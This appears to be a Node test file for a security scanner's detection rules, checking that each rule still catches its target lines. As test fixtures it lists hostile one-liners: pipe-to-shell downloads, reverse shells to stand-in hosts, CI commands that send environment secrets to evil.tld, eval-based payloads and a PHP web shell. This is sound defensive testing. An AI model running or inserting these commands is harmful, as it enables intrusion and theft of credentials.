import assert from "node:assert/strict"
import { test } from "node:test"
import { catalogById, catalogRules, PACKS, rulesInPack } from "@/lib/rules/catalog"
import { matchAddedLines, matchUnicodeRisk } from "@/lib/engine"

/**
 * Coverage, not shape. Every regex in the catalog had to survive the ReDoS
 * check, and rewriting a rule to be *safe* is only acceptable if it is still
 * *effective*. These are the payloads each rule exists to catch, so a rewrite
 * that quietly narrowed one fails here rather than in production.
 */
const CATCHES: [string, string[]][] = [
  ["shell-pipe-to-interpreter", [
    "curl -sSL https://evil.sh | bash",
    "wget -qO- http://x/y | sh",
    "RUN curl https://get.example.com | sudo bash",
    // The rewrite dropped the curl prefix, so a fetch by any other tool counts.
    "fetch -o - https://x | python",
  ]],
  ["shell-reverse-connection", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "nc -e /bin/sh attacker.tld 9001",
    "socat tcp:1.2.3.4:80 exec:/bin/sh",
  ]],
  ["shell-permissive-mode", ["chmod 777 /tmp/x", "chmod u+s /bin/thing", "chmod -R 666 ."]],
  ["ci-secret-exfiltration", [
    "  run: printenv | curl -d @- https://evil.tld",
    "  run: env | base64 -w 0",
    "  run: curl --data \"$TOKEN\" https://evil.tld",
  ]],
  ["ci-action-unpinned", [
    "      - uses: actions/checkout@v4",
    "      - uses: some/action@main",
    // The anchored first attempt missed this: a trailing comment hid the ref.
    "      - uses: actions/checkout@v4  # pin this later",
  ]],
  ["ci-self-hosted-runner", ["    runs-on: self-hosted", "    runs-on: [self-hosted, linux]"]],
  ["ci-pull-request-target", ["on: pull_request_target", "  workflow_run:"]],
  ["container-fetch-and-run", ["RUN curl -sL https://x.sh | sh", "RUN wget -O- http://x | python"]],
  ["js-install-hook-added", ['    "postinstall": "node ./x.js",', '    "prepare" : "sh y.sh"']],
  ["js-obfuscated-payload", ["eval(atob('ZXZpbA=='))", "const cp = require('child_process')"]],
  ["py-dynamic-execution", ["exec(payload)", "pickle.loads(blob)", "__import__('os').system('x')"]],
  ["php-dynamic-execution", ["<?php eval($_GET['c']);", "system($cmd);", "unserialize($input);"]],
  ["php-obfuscated-payload", ["eval(base64_decode($x));", "gzinflate($y)"]],
  ["cpp-build-runs-command", ["execute_process(COMMAND curl x)", "add_custom_command(TARGET t POST_BUILD"]],
  ["cpp-process-execution", ["  system(\"/bin/sh\");", "  popen(cmd, \"r\");"]],
  ["cpp-constructor-attribute", ["__attribute__((constructor)) static void init(void) {"]],
  ["go-module-replace", ["replace github.com/x/y => ../local"]],
  ["go-generate-directive", ["//go:generate sh ./gen.sh"]],
  ["jvm-process-execution", ["Runtime.getRuntime().exec(cmd);", "Class.forName(name);"]],
  ["ruby-dynamic-execution", ["instance_eval(code)", "Open3.capture2(cmd)"]],
  ["dotnet-process-execution", ["Process.Start(psi);", "Assembly.Load(bytes);"]],
  ["rust-process-execution", ["Command::new(\"sh\").arg(\"-c\")"]],
  ["secret-private-key", ["-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----"]],
  ["secret-cloud-credential", ["AWS_KEY=AKIAIOSFODNN7EXAMPLE"]],
  ["secret-service-token", ["ghp_" + "a".repeat(36), "xoxb-123456789012-abcdefghijkl"]],
  ["hidden-by-padding", [" ".repeat(300) + "eval(x)", " ".repeat(3000) + "payload()"]],
  ["gitattributes-filter", ["*.c filter=evil"]],
  ["container-privileged", ["    privileged: true", "      - /var/run/docker.sock:/var/run/docker.sock"]],
  ["infra-state-or-provider-changed", ['  provisioner "local-exec" {', 'data "external" "x" {']],
]

for (const [ruleId, payloads] of CATCHES) {
  test(`${ruleId} catches what it is for`, () => {
    const rule = catalogById.get(ruleId)
    assert.ok(rule, `${ruleId} is not in the catalog`)
    for (const payload of payloads) {
      assert.equal(
        matchAddedLines(rule, [payload]).length,
        1,
        `${ruleId} missed: ${JSON.stringify(payload.slice(0, 60))}`,
      )
    }
  })
}

test("ordinary code does not trip the shell and secret rules", () => {
  const innocent = [
    "const x = 1",
    "  return items.map((i) => i.name)",
    "# Install with: npm install",
    "    runs-on: ubuntu-latest",
    "def process(data): return data",
  ]
  for (const id of ["shell-pipe-to-interpreter", "shell-reverse-connection", "secret-private-key"]) {
    assert.deepEqual(matchAddedLines(catalogById.get(id)!, innocent), [], `${id} fired on clean code`)
  }
})

test("trojan-source catches an attack in any language", () => {
  const rule = catalogById.get("trojan-source")!
  const zw = "admin = 'ad​min'"
  for (const line of [zw, `# ${zw}`, `// ${zw}`, `<?php ${zw}`, `key: ${zw}`]) {
    assert.equal(matchUnicodeRisk(rule, [line]).length, 1)
  }
})

test("every rule belongs to a declared pack, and every pack has rules", () => {
  const declared = new Set<string>(PACKS.map((p) => p.id))
  for (const rule of catalogRules) {
    assert.ok(rule.pack && declared.has(rule.pack), `${rule.id} has no declared pack`)
  }
  for (const pack of PACKS) {
    assert.ok(rulesInPack(pack.id).length > 0, `pack ${pack.id} is empty`)
  }
})

test("rule ids are unique across the whole catalog", () => {
  const ids = catalogRules.map((rule) => rule.id)
  assert.equal(new Set(ids).size, ids.length)
})
